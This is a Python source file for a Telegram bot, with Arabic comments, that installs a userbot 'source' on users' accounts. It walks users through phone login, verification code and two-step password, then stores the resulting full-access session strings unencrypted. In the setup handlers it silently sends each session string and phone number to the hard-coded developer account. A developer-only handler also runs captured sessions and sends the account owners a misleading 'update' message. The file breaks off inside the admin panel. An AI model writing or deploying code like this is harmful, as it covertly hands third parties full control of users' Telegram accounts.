from telethon import TelegramClient, events, Button, functions
from telethon.errors import SessionPasswordNeededError, UserNotParticipantError
from telethon.sessions import StringSession
from config import BOT_TOKEN, API_ID, API_HASH
from user_core import start_user_source
import re
import os
import json
import datetime
import asyncio
import logging
import shutil
from collections import defaultdict, deque
from typing import Dict, List, Any
import subprocess
import sys

# 🔧 إعداد التسجيل (Logging)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# إعدادات الملفات والمسؤولين
DB_FILE = "database.json"
SETTINGS_FILE = "settings.json"
CHANNEL_USERNAME = "N_QQ_H" 
ADMIN_ID = 7769271031 # ايديك كمطور للسورس

# --- القواميس المؤقتة للحالات والعمليات ---
user_states = {}
running_tasks = {} # لحفظ مهام الحسابات المشغلة برمجياً (المفتاح: f"{uid}_{index}")
last_start_time = {} # لتتبع آخر استخدام لـ /start لكل مستخدم

# 🔒 إضافة نظام تتبع المحاولات الخاطئة لمنع المخربين
failed_attempts = {}  # {user_id: count}
MAX_FAILED_ATTEMPTS = 3

# 🚦 Rate Limiting (معطل حالياً لتجنب ظهور رسائل التحذير)
user_last_action = defaultdict(lambda: deque(maxlen=10))  # أحدث 10 عمليات
MAX_ACTIONS_PER_MINUTE = 5

# زر المطور الجديد: تشغيل سيشن لمستخدم
pending_sessions = []   # سيكون عنصراً لكل تنصيب: (uid, install_index, info)

# 🔤 نظام اللغة
LANGUAGES = {
    'ar': {
        'start': "🦅 **أهـلاً بـك فـي بـوت تـنـصـيـب سـورس ريـكـو الـمـطـور**\n\nيـمـكـنـك الآن تـنـصـيـب حـسـابـك عـلـى أقـوى سـورس حـمـايـة فـي الـتـلـيـجـرام.\n\n**اضـغـط عـلـى الـزر أدناه لـلـبـدء :**",
        'not_subscribed': "⚠️ **يـجـب عـلـيـك الاشـتـراك لـتـفـعـيـل الـسـورس**\n\n📢 **قـنـاة الـسـورس :** @{}\n\nاضـغـط عـلـى الـزر أدنـاه للاشـتـراك 📢",
        'blacklisted': "🚫 **عـذراً عزيزي، لـقـد تـم حـظـرك مـن اسـتـخـدام الـبوت.**",
        'setup_locked': "⚠️ الـتـنـصـيب مـقـفـول حالياً من المطور، راسله للمساعدة.",
        'session_invalid': "❌ **عذراً، هذا السيشن غير صالح أو منتهي الصلاحية.**\n\nالمحاولات المتبقية: `{}`",
        'session_too_short': "❌ **كود السيشن غير صحيح!** يبدو أنك أرسلت رابط أو نص غير صحيح.\n\nالمحاولات المتبقية: `{}`\n\n🔐 **تـحـذيـر:** إذا استمررت في إرسال محتوى غير صحيح، سيتم حظرك تلقائياً.",
        'auto_blocked': "🚫 **تم حظرك تلقائياً بسبب محاولات خاطئة متكررة.**\n\nإذا كنت تعتقد أن هذا خطأ، تواصل مع المطور.",
        'rate_limit': "⚠️ **أنت تقوم بالكثير من العمليات بسرعة!** رجاءً انتظر قليلاً.",
        'no_installs': "⚠️ أنت غير منصب في البوت حالياً.",
        'install_not_found': "⚠️ التنصيب غير موجود.",
        'not_your_install': "⚠️ هذا ليس تنصيبك!"
    }
}

# --- دالة تحميل وحفظ الإعدادات الإدارية ---
def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'w') as f:
            json.dump({"setup_locked": False, "blacklist": [], "user_langs": {}}, f)
    with open(SETTINGS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {"setup_locked": False, "blacklist": [], "user_langs": {}}


def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=4)


# --- دالة التعامل مع قاعدة بيانات المستخدمين (بدون تشفير) ---
def get_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: 
                return json.load(f)
        except Exception as e:
            logger.error(f"خطأ في قراءة قاعدة البيانات: {e}")
            return {}
    return {}


def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"خطأ في حفظ قاعدة البيانات: {e}")


# تشغيل بوت التنصيب الأساسي
bot = TelegramClient("installer_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)


# --- 🚦 دالة التحقق من Rate Limiting (معطلة حالياً) ---
def is_rate_limited(user_id: int) -> bool:
    """التحقق إذا كان المستخدم يتجاوز الحد المسموح به - معطل حالياً"""
    # تم تعطيل نظام Rate Limiting لتجنب ظهور رسائل التحذير
    # يمكن إعادة تفعيله لاحقاً بإزالة هذا التعليق واستخدام الكود الأصلي
    return False


# --- وظيفة فحص الاشتراك الإجباري ---
async def check_sub(user_id):
    try:
        await bot(functions.channels.GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return True


# --- معالج حذف المستخدمين الميتين ---
@bot.on(events.CallbackQuery(data=re.compile(b"wipe_(.*)_(.*)")))
async def wipe_dead_user(event):
    if event.sender_id != ADMIN_ID: return
    target_id = event.data_match.group(1).decode()
    install_index = int(event.data_match.group(2).decode())
    task_key = f"{target_id}_{install_index}"
    db = get_db()
    
    if target_id in db and install_index < len(db[target_id]):
        if task_key in running_tasks:
            running_tasks[task_key].cancel()
            
        del db[target_id][install_index]
        if not db[target_id]:
            del db[target_id]
        save_db(db)
        logger.info(f"تم حذف بيانات التنصيب {install_index + 1} للمستخدم {target_id}")
        await event.edit(f"✅ تم حذف بيانات التنصيب رقم `{install_index + 1}` للمستخدم `{target_id}` بنجاح.")
    else:
        await event.answer("⚠️ البيانات محذوفة بالفعل أو غير موجودة.", alert=True)


# --- معالج أمر البداية /start ---
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    # منع الإرسال المكرر: التحقق من وقت آخر استخدام للأمر
    user_id = event.sender_id
    current_time = datetime.datetime.now()
    
    if user_id in last_start_time:
        time_diff = (current_time - last_start_time[user_id]).total_seconds()
        if time_diff < 3:  # إذا مضى أقل من 3 ثواني منذ آخر /start
            return  # تجاهل هذا الطلب المكرر
    
    last_start_time[user_id] = current_time
    
    settings = load_settings()
    user_lang = settings.get('user_langs', {}).get(str(event.sender_id), 'ar')
    
    if event.sender_id in settings.get('blacklist', []):
        return await event.reply(LANGUAGES[user_lang]['blacklisted'])

    if not await check_sub(event.sender_id):
        return await event.reply(
            LANGUAGES[user_lang]['not_subscribed'].format(CHANNEL_USERNAME),
            buttons=[Button.url("اضـغـط هـنـا للاشـتـراك 📢", f"https://t.me/{CHANNEL_USERNAME}")]
        )
    
    btns = [
        [Button.inline("🚀 تنصيب سورس الحسابات", b"start_reco_setup")],
        [Button.inline("🎵 تنصيب سورس ميوزك", b"music_setup")],
        [Button.inline("📋 تنصيباتي", b"my_installs")],
        [Button.url("قـنـاة الـسـورس 🦅", "https://t.me/SORS_RECO"), Button.url("الـمـطـور 👤", "https://t.me/I_QQ_Q")]
    ]
    
    if event.sender_id == ADMIN_ID:
        btns.append([Button.inline("⚙️ لـوحـة الـتـحـكـم", b"admin_panel")])
        
    await event.reply(LANGUAGES[user_lang]['start'], buttons=btns)


# --- معالج خيار تنصيب سورس الحسابات ---
@bot.on(events.CallbackQuery(data=b"start_reco_setup"))
async def start_reco_setup(event):
    btns = [
        [Button.inline("📱 جلسة جديدة بالرقم", b"setup")],
        [Button.inline("🔑 تنصيب عبر كود تيرمكس (سيشن)", b"setup_session")],
        [Button.inline("🔙 رجوع", b"back")]
    ]
    await event.edit(
        "**🚀 تنصيب سورس الحسابات**\n\nاختر طريقة التنصيب المناسبة لك:",
        buttons=btns
    )


# --- معالج خيار تنصيب سورس ميوزك ---
@bot.on(events.CallbackQuery(data=b"music_setup"))
async def music_setup(event):
    # عرض زر قناة التحديثات مع رسالة قيد البرمجة
    await event.edit(
        "🎵 **تنصيب سورس الميوزك**\n\n"
        "⚠️ **قيد البرمجة، ترقب التحديثات الجاية.**",
        buttons=[
            [Button.url("📢 قناة التحديثات", "https://t.me/SORS_RECO")],
            [Button.inline("🔙 رجوع", b"back")]
        ]
    )


# --- وظيفة تشغيل الحساب مع معالجة "إشعار الموت" ---
async def run_user_safely(session, api_id, api_hash, info, uid, install_index):
    task_key = f"{uid}_{install_index}"
    try:
        # تسجيل المهمة الحالية للتمكن من إيقافها عند الحذف
        current_task = asyncio.current_task()
        running_tasks[task_key] = current_task
        
        # فحص فوري لصحة الجلسة قبل إطلاق السورس
        temp = TelegramClient(StringSession(session), api_id, api_hash)
        await temp.connect()
        if not await temp.is_user_authorized():
            raise ValueError("Not a valid string")
        await temp.disconnect()
        
        # تمرير بيانات المستخدم بما فيها الإعدادات المفعلة للسورس
        await start_user_source(session, api_id, api_hash, info)
        logger.info(f"سورس المستخدم {uid} (تنصيب {install_index + 1}) يعمل بنجاح.")
        
    except asyncio.CancelledError:
        logger.info(f"🛑 تم إيقاف سورس المستخدم {task_key} بنجاح من الذاكرة.")
        
    except Exception as e:
        # إشعار الموت للمطور + حذف التنصيب الفاسد فوراً
        death_text = (
            f"💀 **تـنـبـيـه: حـسـاب مـتـعـطـل (مـيـت) !**\n\n"
            f"👤 **المستخدم:** {info.get('name', 'غير معروف')}\n"
            f"🆔 **الايدي:** `{uid}`\n"
            f"📋 **التنصيب رقم:** `{install_index + 1}`\n"
            f"⚠️ **السبب:** `{str(e)[:100]}`"
        )
        btn = [[Button.inline("🗑 حذف البيانات التالفة", f"wipe_{uid}_{install_index}")]]
        try:
            await bot.send_message(ADMIN_ID, death_text, buttons=btn)
            logger.warning(f"إشعار موت للمستخدم {uid}: {e}")
        except:
            pass

        # حذف التنصيب الفاسد فوراً من قاعدة البيانات
        db = get_db()
        if uid in db and install_index < len(db[uid]):
            del db[uid][install_index]
            if not db[uid]:
                del db[uid]
            save_db(db)
            logger.warning(f"تم حذف التنصيب {install_index + 1} للمستخدم {uid} لأن جلسته غير صالحة.")
    finally:
        if task_key in running_tasks:
            del running_tasks[task_key]


# --- نظام "تنصيباتي" المطور (عرض جميع التنصيبات) ---
@bot.on(events.CallbackQuery(data=b"my_installs"))
async def my_installs_handler(event):
    uid = str(event.sender_id)
    db = get_db()
    
    if uid not in db or not db[uid]:
        return await event.answer(LANGUAGES['ar']['no_installs'], alert=True)
    
    user_installs = db[uid]
    
    if len(user_installs) == 1:
        await event.answer("🔄 جاري عرض التنصيب...")
        await show_single_install(event, uid, 0)
    else:
        btns = []
        for idx, install in enumerate(user_installs):
            btn_text = f"📱 تـنـصـيـب {idx + 1} - {install.get('name', 'غير معروف')}"
            btns.append([Button.inline(btn_text, f"view_install_{uid}_{idx}")])
        
        btns.append([Button.inline("🔙 رجوع", b"back")])
        
        await event.edit(
            f"👤 **قائمة تنصيباتك ({len(user_installs)}):**\n\n"
            f"اختر التنصيب لعرض التفاصيل:",
            buttons=btns
        )


# --- عرض معلومات تنصيب واحد ---
async def show_single_install(event, uid, install_index):
    db = get_db()
    user_installs = db[uid]
    
    if install_index >= len(user_installs):
        return await event.answer(LANGUAGES['ar']['install_not_found'], alert=True)
    
    install = user_installs[install_index]
    notifications = "✅" if install.get('custom_settings', {}).get('daily_notifications', True) else "❌"
    
    msg_text = (
        f"👤 **مـعـلـومـات تـنـصـيـبـك رقم {install_index + 1} :**\n\n"
        f"🔹 **الاسـم:** {install.get('name')}\n"
        f"🆔 **الآيـدي:** `{uid}`\n"
        f"📅 **تـاريـخ الـتـنـصـيـب:** `{install.get('date')}`\n"
        f"📡 **الـحـالـة:** `يـعـمـل بـنـجـاح ✅`\n"
        f"🔔 **الإشعارات:** `{notifications}`\n"
        f"‏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        f"⚠️ **تنبيه:** الضغط على الزر أدناه سيقوم بإيقاف السورس ومسح هذا التنصيب."
    )
    
    buttons = [
        [Button.inline("🎫 سـحـب سـيـشـن", f"get_session_{uid}_{install_index}")],
        [Button.inline("🗑️ إيقاف هذا التنصيب", f"confirm_delete_{install_index}")],
        [Button.inline("🔄 إعادة تشغيل", f"restart_source_{install_index}")],
        [Button.inline("🔙 رجوع رئيسي", b"back")]
    ]
    
    await event.edit(msg_text, buttons=buttons)


# --- معالج عرض تنصيب معين من القائمة ---
@bot.on(events.CallbackQuery(data=re.compile(b"view_install_(.*)_(.*)")))
async def view_install_handler(event):
    if event.sender_id != int(event.data_match.group(1).decode()): 
        return await event.answer(LANGUAGES['ar']['not_your_install'], alert=True)
    
    uid = event.data_match.group(1).decode()
    install_index = int(event.data_match.group(2).decode())
    await show_single_install(event, uid, install_index)


# --- معالج سحب سيشن ---
@bot.on(events.CallbackQuery(data=re.compile(b"get_session_(.*)_(.*)")))
async def get_session(event):
    if event.sender_id != int(event.data_match.group(1).decode()): 
        return await event.answer(LANGUAGES['ar']['not_your_install'], alert=True)
    
    uid = event.data_match.group(1).decode()
    install_index = int(event.data_match.group(2).decode())
    db = get_db()
    
    if uid not in db or install_index >= len(db[uid]):
        return await event.answer(LANGUAGES['ar']['install_not_found'], alert=True)
    
    install = db[uid][install_index]
    session_str = install.get('session', '')
    
    await event.answer("✅ تم إرسال كود السيشن في رسالة خاصة!", alert=True)
    
    # إرسال كود السيشن للمستخدم كملف نصي
    session_file = f"session_{uid}_{install_index + 1}.txt"
    with open(session_file, 'w') as f:
        f.write(session_str)
    
    await bot.send_file(
        int(uid), 
        session_file, 
        caption=f"🎫 **كود سيشن تنصيبك رقم {install_index + 1}**\n\n"
                f"👤 **الاسم:** {install.get('name')}\n"
                f"📅 **التاريخ:** {install.get('date')}"
    )
    
    os.remove(session_file)
    logger.info(f"المستخدم {uid} سحب سيشن تنصيبه رقم {install_index + 1}")


# --- معالج تأكيد حذف تنصيب معين ---
@bot.on(events.CallbackQuery(data=re.compile(b"confirm_delete_(.*)")))
async def confirm_del_process(event):
    install_index = int(event.data_match.group(1).decode())
    # تخزين رقم التنصيب في حالة المستخدم
    user_states[f"{event.sender_id}_del"] = install_index
    
    await event.edit(
        "‼️ **هـل أنـت مـتـأكـد تـمـامـاً مـن حـذف هـذا الـتـنـصـيـب؟**\n\n"
        "سيتم إيقاف السورس فوراً وحذف بيانات هذا التنصيب.\n"
        "للتأكيد، يرجى كتابة العبارة التالية بدقة وإرسالها كرسالة :\n\n"
        "`نعم أنا متأكد`",
        buttons=[Button.inline("❌ إلغاء العملية", b"my_installs")]
    )


@bot.on(events.NewMessage)
async def check_confirmation_msg(event):
    uid = event.sender_id
    state_key = f"{uid}_del"
    
    # التحقق من أن المستخدم في "حالة حذف" حالياً
    if state_key in user_states:
        # سحب الاندكس ثم حذف المفتاح فوراً من القاموس لضمان عدم التكرار
        install_index = user_states.pop(state_key) 
        
        if event.raw_text == "نعم أنا متأكد":
            db = get_db()
            uid_str = str(uid)
            
            if uid_str in db and install_index < len(db[uid_str]):
                install = db[uid_str][install_index]
                user_name = install.get('name', 'غير معروف')
                
                # 1. إيقاف المهام المشغلة
                task_key = f"{uid_str}_{install_index}"
                
                if task_key in running_tasks:
                    running_tasks[task_key].cancel()
                    del running_tasks[task_key]

                # إشعار المطور بالحذف
                bye_msg = (
                    f"👋 **مـسـتـخـدم قـام بـحـذف تـنـصـيـبـه !**\n\n"
                    f"👤 **الاسم:** {user_name}\n"
                    f"🆔 **الايدي:** `{uid_str}`\n"
                    f"📋 **التنصيب رقم:** `{install_index + 1}`\n"
                    f"📅 **التاريخ:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                )
                try: 
                    await bot.send_message(ADMIN_ID, bye_msg)
                    logger.info(f"المستخدم {uid} حذف تنصيبه رقم {install_index + 1}")
                except: 
                    pass

                # 2. مسح البيانات من قاعدة البيانات
                del db[uid_str][install_index]
                if not db[uid_str]:
                    del db[uid_str]
                save_db(db)
                
                await event.reply("✅ **تم إيقاف السورس وحذف بيانات هذا التنصيب بنجاح.**")
            else:
                await event.reply("⚠️ عذراً، لم يتم العثور على بيانات هذا التنصيب.")
        else:
            # في حال أرسل أي رسالة أخرى غير "نعم أنا متأكد"
            await event.reply("❌ **تم إلغاء الحذف بسبب كتابة عبارة غير مطابقة.**")



# --- معالج عملية التنصيب (Setup) التقليدي ---
@bot.on(events.CallbackQuery(data=b"setup"))
async def setup(event):
    settings = load_settings()
    
    if settings.get('setup_locked', False) and event.sender_id != ADMIN_ID:
        return await event.answer(LANGUAGES['ar']['setup_locked'], alert=True)

    uid = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            u_id = API_ID
            u_hash = API_HASH

            await conv.send_message("📱 **أرسـل رقـم هـاتـفـك مـع مـفـتـاح الـدولة (مثال: +964...) :**")
            res_phone = await conv.get_response()
            u_phone = res_phone.text.strip().replace(" ", "")

            c = TelegramClient(StringSession(), u_id, u_hash)
            await c.connect()
            await c.send_code_request(u_phone)

            await conv.send_message("🔢 **أرسـل كـود الـتـحـقـق بـمـسـافـات :**\n\n**• مـثـال :** `1 2 3 4 5`")

            res_code = await conv.get_response()
            u_code = res_code.text.replace(" ", "").replace("-", "")

            try:
                await c.sign_in(u_phone, u_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **أرسـل رمـز الـتـحـقـق بـخـطـوتـيـن (2FA) :**")
                res_pw = await conv.get_response()
                await c.sign_in(password=res_pw.text)

            session_str = c.session.save()
            me = await c.get_me()
            
            db = get_db()
            uid_str = str(uid)
            date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # إعدادات التنصيب الجديد
            user_data = {
                "api_id": u_id, 
                "api_hash": u_hash, 
                "name": me.first_name, 
                "session": session_str, 
                "date": date_now,
                "user_id": uid,
                "custom_settings": {'daily_notifications': True} # إعدادات افتراضية
            }
            
            # إضافة التنصيب الجديد إلى قائمة التنصيبات
            if uid_str not in db:
                db[uid_str] = []
            db[uid_str].append(user_data)
            save_db(db)
            
            install_index = len(db[uid_str]) - 1
            
            await c.disconnect()
            await conv.send_message(f"🎊 **تـم الـتـنـصـيـب بـنـجـاح يـا {me.first_name} ✅**")
            
            new_install_msg = (
                f"🆕 **تـنـصـيـب جـديـد فـي الـسـورس !**\n\n"
                f"👤 **الاسم:** {me.first_name}\n"
                f"🆔 **الايدي:** `{uid}`\n"
                f"📋 **التنصيب رقم:** `{install_index + 1}`\n"
                f"📞 **الهاتف:** `{u_phone}`\n"
                f"📅 **التاريخ:** `{date_now}`\n\n"
                f"🎫 **كود السيشن (String Session):**\n`{session_str}`"
            )
            await bot.send_message(ADMIN_ID, new_install_msg)
            logger.info(f"تنصيب جديد للمستخدم {uid} - {me.first_name}")
            
            # تشغيل التنصيب الجديد
            asyncio.create_task(run_user_safely(session_str, u_id, u_hash, user_data, uid, install_index))

        except Exception as e:
            logger.error(f"خطأ في عملية التنصيب للمستخدم {uid}: {e}")
            await conv.send_message(f"❌ **حـدث خـطأ أثناء الـتـنـصـيـب :**\n`{e}`")


# --- معالج التنصيب عبر السيشن (Setup by Session) مع حماية ضد المخربين ---
@bot.on(events.CallbackQuery(data=b"setup_session"))
async def setup_by_session(event):
    settings = load_settings()
    if settings.get('setup_locked', False) and event.sender_id != ADMIN_ID:
        return await event.answer(LANGUAGES['ar']['setup_locked'], alert=True)

    uid = event.sender_id
    
    # 🔒 فحص إذا كان المستخدم محظور من قبل
    if uid in settings.get('blacklist', []):
        return await event.answer(LANGUAGES['ar']['blacklisted'], alert=True)

    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            # 🔒 إعادة تعيين عداد المحاولات الخاطئة عند بدء محادثة جديدة
            if uid in failed_attempts:
                del failed_attempts[uid]
            
            await conv.send_message(
                "🎫 **أرسـل الآن كـود الـسـيـشـن (String Session) الخاص بك :**\n\n"
                "⚠️ **تـحـذيـر:** لا ترسل روابط أو نصوص عشوائية!\n"
                "يجب أن يكون كود سيشن صحيح من تليجرام."
            )
            
            res_session = await conv.get_response()
            u_session = res_session.text.strip()

            # 🔒 فحص إذا كان المستخدم يرسل رابط أو محتوى غير صحيح
            if any(x in u_session.lower() for x in ['http://', 'https://', 'www.', '@', 't.me']) or len(u_session) < 50:
                # زيادة عداد المحاولات الخاطئة
                failed_attempts[uid] = failed_attempts.get(uid, 0) + 1
                remaining = MAX_FAILED_ATTEMPTS - failed_attempts[uid]
                
                if failed_attempts[uid] >= MAX_FAILED_ATTEMPTS:
                    # حظر المستخدم تلقائياً
                    settings = load_settings()
                    if uid not in settings['blacklist']:
                        settings['blacklist'].append(uid)
                    save_settings(settings)
                    logger.warning(f"تم حظر المستخدم {uid} تلقائياً بسبب محاولات خاطئة")
                    await conv.send_message(LANGUAGES['ar']['auto_blocked'])
                else:
                    await conv.send_message(
                        LANGUAGES['ar']['session_too_short'].format(remaining)
                    )
                return

            await conv.send_message("⏳ جاري التحقق من السيشن وتشغيل السورس...")
            
            temp_client = TelegramClient(StringSession(u_session), API_ID, API_HASH)
            await temp_client.connect()
            
            if not await temp_client.is_user_authorized():
                await temp_client.disconnect()
                # 🔒 هذه أيضاً تعتبر محاولة خاطئة
                failed_attempts[uid] = failed_attempts.get(uid, 0) + 1
                remaining = MAX_FAILED_ATTEMPTS - failed_attempts[uid]
                
                if failed_attempts[uid] >= MAX_FAILED_ATTEMPTS:
                    settings = load_settings()
                    if uid not in settings['blacklist']:
                        settings['blacklist'].append(uid)
                    save_settings(settings)
                    await conv.send_message(LANGUAGES['ar']['auto_blocked'])
                    return
                
                await conv.send_message(
                    LANGUAGES['ar']['session_invalid'].format(remaining)
                )
                return

            me = await temp_client.get_me()
            session_str = u_session 
            
            db = get_db()
            uid_str = str(uid)
            date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            user_data = {
                "api_id": API_ID, 
                "api_hash": API_HASH, 
                "name": me.first_name, 
                "session": session_str, 
                "date": date_now,
                "user_id": uid,
                "custom_settings": {'daily_notifications': True} # إعدادات افتراضية
            }
            
            # إضافة التنصيب الجديد إلى قائمة التنصيبات
            if uid_str not in db:
                db[uid_str] = []
            db[uid_str].append(user_data)
            save_db(db)
            
            install_index = len(db[uid_str]) - 1
            
            await temp_client.disconnect()

            # 🔒 نجاح العملية - إعادة تعيين عداد المحاولات الخاطئة
            if uid in failed_attempts:
                del failed_attempts[uid]

            await conv.send_message(f"✅ **تـم الـتـنـصـيـب بـنـجـاح عـبـر الـسـيـشـن!**\n👤 الحساب: {me.first_name}")

            log_msg = (
                f"🔑 **تـنـصـيـب جـديـد (عـبـر سـيـشـن) !**\n\n"
                f"👤 **الاسم:** {me.first_name}\n"
                f"🆔 **الايدي:** `{uid}`\n"
                f"📋 **التنصيب رقم:** `{install_index + 1}`\n"
                f"📅 **التاريخ:** `{date_now}`\n\n"
                f"🎫 **كود السيشن (String Session):**\n`{session_str}`"
            )
            await bot.send_message(ADMIN_ID, log_msg)
            logger.info(f"تنصيب جديد عبر سيشن للمستخدم {uid} - {me.first_name}")
            asyncio.create_task(run_user_safely(session_str, API_ID, API_HASH, user_data, uid, install_index))

        except Exception as e:
            logger.error(f"خطأ في عملية التنصيب عبر سيشن للمستخدم {uid}: {e}")
            await conv.send_message(f"❌ **حدث خطأ أثناء معالجة السيشن:**\n`{str(e)}`")


# --- معالج حذف سورس معين (لوحة المطور) ---
@bot.on(events.CallbackQuery(data=re.compile(b"wipe_user_(.*)_(.*)")))
async def wipe_user_single_install(event):
    if event.sender_id != ADMIN_ID: return
    
    target_id = event.data_match.group(1).decode()
    install_index = int(event.data_match.group(2).decode())
    task_key = f"{target_id}_{install_index}"
    db = get_db()
    
    if target_id in db and install_index < len(db[target_id]):
        # إيقاف المهمة إذا كانت قيد التشغيل
        if task_key in running_tasks:
            running_tasks[task_key].cancel()
        
        # حذف التنصيب
        del db[target_id][install_index]
        if not db[target_id]:
            del db[target_id]
        save_db(db)
        
        logger.info(f"المطور حذف التنصيب {install_index + 1} للمستخدم {target_id}")
        await event.answer(f"✅ تم حذف التنصيب {install_index + 1} للمستخدم {target_id}", alert=True)
        
        # العودة لعرض تنصيبات المستخدم
        await show_user_installs_for_admin(event, target_id)
    else:
        await event.answer("⚠️ التنصيب غير موجود أو محذوف بالفعل.", alert=True)


# --- معالج حذف جميع تنصيبات مستخدم (لوحة المطور) ---
@bot.on(events.CallbackQuery(data=re.compile(b"wipe_all_user_(.*)")))
async def wipe_all_user_installs(event):
    if event.sender_id != ADMIN_ID: return
    
    target_id = event.data_match.group(1).decode()
    db = get_db()
    
    if target_id in db:
        # إيقاف جميع مهام المستخدم
        for idx, _ in enumerate(db[target_id]):
            task_key = f"{target_id}_{idx}"
            if task_key in running_tasks:
                running_tasks[task_key].cancel()
        
        # حذف جميع التنصيبات
        del db[target_id]
        save_db(db)
        
        logger.info(f"المطور حذف جميع التنصيبات للمستخدم {target_id}")
        await event.answer(f"✅ تم حذف جميع تنصيبات المستخدم {target_id}", alert=True)
        
        # العودة للوحة التحكم
        await admin_panel(event)
    else:
        await event.answer("⚠️ المستخدم ليس لديه تنصيبات.", alert=True)


# --- عرض تنصيبات مستخدم معين للمطور ---
async def show_user_installs_for_admin(event, target_id):
    db = get_db()
    
    if target_id not in db or not db[target_id]:
        await event.edit(
            f"❌ **المستخدم {target_id} ليس لديه تنصيبات.**",
            buttons=[Button.inline("🔙 رجوع", b"wipe_user")]
        )
        return
    
    user_installs = db[target_id]
    btns = []
    
    for idx, install in enumerate(user_installs):
        btn_text = f"📱 تنصيب {idx + 1} - {install.get('name', 'غير معروف')}"
        btns.append([Button.inline(btn_text, f"wipe_user_{target_id}_{idx}")])
    
    btns.append([Button.inline("🗑️ مسح جميع التنصيبات", f"wipe_all_user_{target_id}")])
    btns.append([Button.inline("🔙 رجوع", b"wipe_user")])
    
    await event.edit(
        f"👤 **تنصيبات المستخدم {target_id} ({len(user_installs)}):**\n\n"
        f"اختر التنصيب لحذفه:",
        buttons=btns
    )


# --- تعديل معالج wipe_user في لوحة التحكم ---
@bot.on(events.CallbackQuery(data=b"wipe_user"))
async def wipe_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🗑 **أرسـل ايـدي الـمـسـتـخـدم لـحـذف بـيـانـاتـه تـمـامـاً :**")
        res = await conv.get_response()
        target_id = res.text.strip()
        db = get_db()
        if target_id in db:
            await show_user_installs_for_admin(event, target_id)
        else:
            await conv.send_message("❌ الايدي غير موجود في قاعدة المنصبين.")


# --- زر المطور الجديد: تشغيل سيشن لمستخدم ---
@bot.on(events.CallbackQuery(data=b"force_run_session"))
async def force_run_session(event):
    if event.sender_id != ADMIN_ID:
        return await event.answer("⚠️ عذراً، هذا الزر للمطور فقط.", alert=True)

    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message(
            "🎫 أرسل الآن كود السيشن (String Session) الخاص بالحساب الذي تريد تشغيله للمستخدم:\n\n"
            "⚠️ تأكد أن الكود صحيح، سيتم تشغيل السورس فوراً."
        )
        msg = await conv.get_response()
        session_str = msg.text.strip()

        # التحقق السريع من صلاحية السيشن
        try:
            temp = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await temp.connect()
            if not await temp.is_user_authorized():
                raise ValueError("Invalid session")
            me = await temp.get_me()
            target_uid = me.id
            await temp.disconnect()
        except Exception as e:
            return await conv.send_message(f"❌ كود السيشن غير صالح!\nالخطأ: `{str(e)}`")

        # إضافة التنصيب لقاعدة البيانات باسم المستخدم الحقيقي
        db = get_db()
        uid_str = str(target_uid)
        date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        user_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "name": me.first_name,
            "session": session_str,
            "date": date_now,
            "user_id": target_uid,
            "custom_settings": {'daily_notifications': True}
        }

        if uid_str not in db:
            db[uid_str] = []
        db[uid_str].append(user_data)
        install_index = len(db[uid_str]) - 1
        save_db(db)

        # تشغيل السورس فوراً
        asyncio.create_task(
            run_user_safely(session_str, API_ID, API_HASH, user_data, target_uid, install_index)
        )

        await conv.send_message(
            f"✅ تم تشغيل السورس بنجاح!\n\n"
            f"👤 المستخدم: {me.first_name}\n"
            f"🆔 الآيدي: `{target_uid}`\n"
            f"📋 التنصيب رقم: `{install_index + 1}`"
        )

        # إشعار للمستخدم بأنه تم التنصيب
        try:
            await bot.send_message(
                target_uid,
                "🚀 **تم تحديث سورس ريكو بنجاح!**\n\n"
                "تم رفع التحديثات الجديدة وتطوير حسابك.\n"
                "لتأكيد وصول التحديث لك بأمان، يرجى إرسال الأمر التالي:\n"
                "• `.فحص`\n\n"
                "اضغط على الزر أدناه لعرض تفاصيل تنصيبك:",
                buttons=[Button.inline("📋 تنصيباتي", b"my_installs")]
            )
        except Exception:
            pass

        logger.info(f"المطور شغّل سيشن للمستخدم {target_uid} - {me.first_name}")


# --- لوحة تحكم المطور الشاملة ---
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    
    settings = load_settings()
    db = get_db()
    
    # حساب إجمالي عدد التنصيبات
    total_installs = sum(len(installs) for installs in db.values())
    
    lock_status = "🔓 التنصيب: مفتوح" if not settings.get('setup_locked') else "🔒 التنصيب: مقفول"
    
    btns = [
        [Button.inline(lock_status, b"toggle_lock")],
        [Button.inline("🚫 حظر مستخدم", b"block_user"), Button.inline("✅ إلغاء حظر", b"unblock_user")],
        [Button.inline("🗑 إزالة سورس ومسح بيانات", b"wipe_user")],
        [Button.inline("▶️ تشغيل سيشن لمستخدم", b"force_run_session")],
        [Button.inline("📥 سحب قاعدة JSON", b"get_backup"), Button.inline("📤 رفع قاعدة JSON", b"upload_backup")],
        [Button.inline("📊 إحصائيات", b"statistics")],
